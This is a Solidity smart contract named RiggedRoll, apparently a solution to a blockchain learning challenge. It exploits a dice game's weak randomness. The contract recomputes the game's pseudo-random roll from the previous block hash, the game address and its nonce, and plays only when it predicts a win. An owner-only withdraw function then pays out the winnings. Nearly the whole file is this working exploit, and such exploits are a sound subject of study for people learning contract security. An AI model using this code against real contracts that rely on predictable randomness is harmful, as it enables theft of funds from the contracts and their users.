pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    event Received(address, uint256);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

   function withdraw(address _addr, uint256 _amount) public onlyOwner {
       require(_amount > 0, "Amount must be greater than 0");
       require(_addr != address(0), "Address cannot be null");
       require(address(this).balance >= _amount, "Not enough ether to withdraw");

       (bool sent, ) = _addr.call{value: _amount}("");
       require(sent, "Failed to send Ether");
   }


    function riggedRoll() public payable{
        uint256 amount = 2000000000000000;
        require(address(this).balance >= amount , "Not enough ether to rig the game");

        // predict randomness
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash,address(diceGame) ,diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16; 
        console.log("rigged contract rolled a: ", roll);
            
        require(roll <= 2, "Not gonna win this throw");
            console.log("Winning roll is: ", roll);
            diceGame.rollTheDice{value: amount}();
    }

    receive() external payable {
        console.log(
            "Rigged contract recieved %s from %s",
            msg.value,
            msg.sender
        );
        emit Received(msg.sender, msg.value);
    }
}
